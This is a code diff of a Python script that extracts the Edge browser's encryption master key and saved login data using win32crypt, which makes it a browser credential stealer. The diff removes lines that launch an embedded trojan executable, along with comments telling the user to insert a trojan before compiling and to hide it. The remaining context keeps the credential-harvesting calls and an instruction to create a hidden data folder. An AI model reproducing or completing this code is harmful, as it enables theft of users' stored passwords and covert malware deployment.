@@ -3,8 +3,6 @@ import json
 import base64
 from win32 import win32crypt
 import shutil
-import subprocess
-
 
 def get_master_key(path,output):
     try:
@@ -46,9 +44,4 @@ if __name__ == "__main__":
     get_master_key(EdgePath, EdgeKey)
     get_login_data(EdgePath, EdgeData)
     
-    
-    # change this and put your trojan before you compile
-    trojan = r"test.exe" 
-    subprocess.run([trojan])
-    # dont forget to hide the trojan
     # also create a "Data" folder and hide it
